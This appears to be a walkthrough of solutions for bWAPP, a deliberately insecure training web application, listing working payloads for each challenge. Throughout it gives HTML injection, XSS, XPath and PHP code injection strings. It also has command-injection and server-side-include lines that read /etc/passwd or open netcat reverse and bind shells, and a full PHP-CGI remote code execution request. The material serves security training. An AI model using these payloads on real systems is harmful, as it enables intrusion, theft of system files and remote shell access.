<b>bWAPP is an insecure open-source web application designed to improve the skills of students, developers or people interested in IT security in order to discover and prevent web vulnerabilities</b>


<h3> my expectation bWAPP is the best Insecure  web application to test owasp top 10 for Student</h3>
# A1 - Injection

### HTML Injection - Reflected (GET)
htmli_get.php

```
192.168.200.150/bWAPP/htmli_get.php?firstname=%3Ch1%3EHello%3C%2Fh1%3E&lastname=%3Ch2%3EWorld%3C%2Fh2%3E&form=submit
```

### HTML Injection - Reflected (POST)

```
<h1>Hello</h1>
<h2>World</h2>
```
### HTML Injection - Stored (Blog)

Following solution taken from:

```
<div class="code"><iframe SRC="http://192.168.200.130:775" height="0" width="0"></iframe></div>
```
Attacker's machine:
```
nc -lvp 775
```

### OS Command Injection
```
127.0.0.1; cat /etc/passwd
127.0.0.1 & cat /etc/passwd
127.0.0.1 | cat /etc/passwd
127.0.0.1 && nc -vn 192.168.254.128 775 -e /bin/bash
```

Attacker's machine:
```
nc -lvp 775
```


### OS Command Injection - Blind
```
127.0.0.1 | sleep 10
```

### PHP Code Injection

```
192.168.200.130/bWAPP/phpi.php?message=a;echo "what"; $fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo $result
```

### Server-Side Includes:

```
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="nc -lvp 775 -e /bin/bash" -->
Attacker's machine:
```
nc -nv 192.168.200.150 775

### XPath Injection (Login Form)
```
password=' or id='2
```

### XML/XPath Injection (Search)
```
genre=')]/password | a[contains(a,'
genre=') or contains(genre, '
genre=') or not(contains(genre, 'xxx') and '1'='2
```


# A3 - Cross-Site Scripting (XSS) 

### XSS - Reflected (GET)
xss_get.php

```
<script>alert(Hi )</script>
```
### XSS - Reflected (POST)

xss_post.php
```
<script>alert(2017)</script>
```

### XSS - Reflected (JSON)

xss_json.php
```
"}]}';prompt(2017)</script>
```

### XSS - Reflected (AJAX/JSON)

xss_ajax_2-1.php
```
<svg onload=prompt(2017)>
```

### XSS - Reflected (AJAX/XML)
xss_ajax_1-1.php
```
&lt;img src=&apos;#&apos; onerror=&apos;alert(1)&apos;&gt;
```

Alternatively I was able to get XSS to execute on the AJAX called.
```
xss_ajax_1-2.php?title=<html xmlns='http://www.w3.org/1999/xhtml'><script>prompt(2017)</script></html>
```

### XSS - Reflected (Back Button)
Modify Referer header field
```
Referer: ';alert(2017);'
```

### XSS - Reflected (Custom Header)
Add header field
```
bWAPP: <script>alert(2017)</script>
```

### XSS - Reflected (Eval)
```
date=alert(2017)
```

### XSS - Reflected (HREF)
```
Referer: <script>alert(2017)</script>
```

### XSS - Reflected (User-Agent)
```
User-Agent: <script>alert(2017)</script>
```
### PHP CGI Remote Code Execution
```
POST /bWAPP/admin/phpinfo.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
Host: 192.168.200.150
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 70
Cookie: security_level=0; PHPSESSID=e27e4148fbb0b82028e1cd6e159f4e7a
Connection: close

<?php $r; exec('cat /etc/passwd', $r); echo implode($r, "\n"); die; ?>
```



